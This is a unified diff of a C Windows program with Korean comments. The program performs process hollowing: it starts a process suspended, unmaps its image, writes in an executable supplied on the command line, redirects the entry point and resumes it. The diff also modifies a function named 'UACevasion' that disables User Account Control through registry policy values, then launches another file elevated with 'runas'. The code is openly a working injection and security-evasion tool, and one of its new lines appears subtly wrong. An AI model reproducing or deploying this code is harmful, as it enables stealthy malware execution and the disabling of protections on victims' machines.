@@ -1,9 +1,7 @@
 #include <stdio.h>
 #include <Windows.h>
 #include <winternl.h>
-#include <ShlObj.h>
 #pragma comment(lib,"ntdll.lib")
-
 
 EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
 EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
@@ -14,20 +12,20 @@ EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
 EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);
 
 
-BOOL RunAsAdmin(HWND hWnd, LPTSTR lpFile, LPTSTR lpParameters)
+BOOL ShellExcuteFunc(HWND hWnd, LPTSTR lpFile, LPTSTR lpParameters)
 {
-	SHELLEXECUTEINFO exeset;
-	ZeroMemory(&exeset, sizeof(exeset));
+	SHELLEXECUTEINFO si;
+	ZeroMemory(&si, sizeof(si));
 
-	exeset.cbSize = sizeof(SHELLEXECUTEINFOW);
-	exeset.hwnd = hWnd;
-	exeset.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_FLAG_NO_UI;
-	exeset.lpVerb = TEXT("runas");
-	exeset.lpFile = lpFile;
-	exeset.lpParameters = lpParameters;
-	exeset.nShow = SW_SHOWNORMAL;
+	si.cbSize = sizeof(SHELLEXECUTEINFOW);
+	si.hwnd = hWnd;
+	si.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_FLAG_NO_UI;
+	si.lpVerb = TEXT("runas");
+	si.lpFile = lpFile;
+	si.lpParameters = lpParameters;
+	si.nShow = SW_SHOWNORMAL;
 
-	if (!ShellExecuteEx(&exeset)){
+	if (!ShellExecuteEx(&si)){
 		return FALSE;
 
 	}
@@ -38,16 +36,64 @@ BOOL RunAsAdmin(HWND hWnd, LPTSTR lpFile, LPTSTR lpParameters)
 BOOL UACevasion() {
 	HKEY hKey = nullptr;
 	DWORD dwValue = 0;
-	LONG ret = RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", &hKey);
+	DWORD ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0, KEY_SET_VALUE, &hKey);
 	if (ret == ERROR_SUCCESS) {
-		RegSetValueEx(hKey, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (CONST BYTE*) & dwValue, sizeof(DWORD));
+		RegSetValueEx(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE *)dwValue, sizeof(DWORD));
 	}
-	else {
-		printf("\nUAC우회실패 \n");
-	}
+	if (hKey != NULL) RegCloseKey(hKey);
 
 	return false;
 }
+
+BOOL SetPrivilege(
+	HANDLE hToken,          // access token handle
+	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
+	BOOL bEnablePrivilege   // to enable or disable privilege
+)
+{
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
+
+	if (!LookupPrivilegeValue(
+		NULL,            // lookup privilege on local system
+		lpszPrivilege,   // privilege to lookup 
+		&luid))        // receives LUID of privilege
+	{
+		printf("LookupPrivilegeValue error: %u\n", GetLastError());
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	if (bEnablePrivilege)
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	else
+		tp.Privileges[0].Attributes = 0;
+
+	// Enable the privilege or disable all privileges.
+
+	if (!AdjustTokenPrivileges(
+		hToken,
+		FALSE,
+		&tp,
+		sizeof(TOKEN_PRIVILEGES),
+		(PTOKEN_PRIVILEGES)NULL,
+		(PDWORD)NULL))
+	{
+		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+		return FALSE;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+
+	{
+		printf("The token does not have the specified privilege. \n");
+		return FALSE;
+	}
+	return TRUE;
+}
+
+
 
 int main(int argc, char* argv[]) {
 	PIMAGE_DOS_HEADER pDosH;
@@ -56,7 +102,7 @@ int main(int argc, char* argv[]) {
 
 	PVOID image, mem, base;
 	DWORD i, read, nSizeOfFile;
-	HANDLE hFile;
+	HANDLE hF;
 
 	STARTUPINFO si; //TARTUPINFO 구조체 변수들은 프로세스의 속성 정보를 전달
 	PROCESS_INFORMATION pi; //생성된 프로세스 정보를 담는 구조체 (메인 스레드 정보)
@@ -68,29 +114,30 @@ int main(int argc, char* argv[]) {
 	memset(&pi, 0, sizeof(pi));
 
 	if (!CreateProcess(NULL, argv[1], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+//	if (!ShellExecute(NULL, "open", argv[1], NULL, NULL, CREATE_SUSPENDED, NULL, &si, &pi)) {
 		printf("\nCreateProcess false... %d \n", GetLastError());
 		return 1;
 	}
 
 
 	//대체할 프로그램을 파일 형식으로 열어두기위한 CreateFile.
-	hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) {
+	hF= CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hF == INVALID_HANDLE_VALUE) {
 		printf("\nCreateFile false... \n");
 		NtTerminateProcess(pi.hProcess, 1);
 		return 1;
 	}
 
-	nSizeOfFile = GetFileSize(hFile, NULL);
+	nSizeOfFile = GetFileSize(hF, NULL);
 
 	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) {
+	if (!ReadFile(hF, image, nSizeOfFile, &read, NULL)) {
 		printf("\nReadFile false... \n");
 		NtTerminateProcess(pi.hProcess, 1);
 		return 1;
 	}
-	NtClose(hFile);
+	NtClose(hF);
 
 
 	//시그니처 체크
@@ -105,12 +152,12 @@ int main(int argc, char* argv[]) {
 	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);
 
 	// 자식프로세스의 메인 스레드의 컨텍스트얻기.
-	// pi 구조체의 스레드 부분에서 현재 레지스터 상태를 _CONTEXT 구조체에 초기화.. ★ 내가몰랐던부분
+	// pi 구조체의 스레드 부분에서 현재 레지스터 상태를 _CONTEXT 구조체에 초기화.. ★
 	NtGetContextThread(pi.hThread, &tContext);
 
 
 	//타겟 프로세스(껍데기) PEB로부터 ImageBase address 얻기
-	//ebx 레지스터에서 PEB 주소를 가져오고 PEB에서 실행 이미지의 기본 주소를 읽음
+	//rdx 레지스터에서 PEB 주소를 가져오고 PEB에서 실행 이미지의 기본 주소를 읽음
 	NtReadVirtualMemory(pi.hProcess, (PVOID)(tContext.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);
 
 	// 만약 원본 이미지가 대체할 실행파일과 주소가 동일하다면 자식프로세스에서 원본 실행파일을 바로 언매핑함.
@@ -145,7 +192,7 @@ int main(int argc, char* argv[]) {
 
 
 	// CONTEXT 구조체 재정의 및 스레드 재가동
-	//주입된 이미지의 시작점에 Rcx레지스터
+	// 주입된 이미지의 시작점에 Rcx레지스터
 	tContext.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
 	printf("New EP: %#zx\n", tContext.Rcx);
 
@@ -159,8 +206,7 @@ int main(int argc, char* argv[]) {
 
 	printf("\nUAC 우회시작. \n");
 	UACevasion();
-	RunAsAdmin(NULL,(LPTSTR)argv[3],0);
-
+	ShellExcuteFunc(NULL, (LPTSTR)argv[3], 0);
 
 	printf("\n후. 자식프로세스가 종료되기를 기다린다..\n");
 	//자식프로세스 종료될때까지 ㄱㄷ리는중
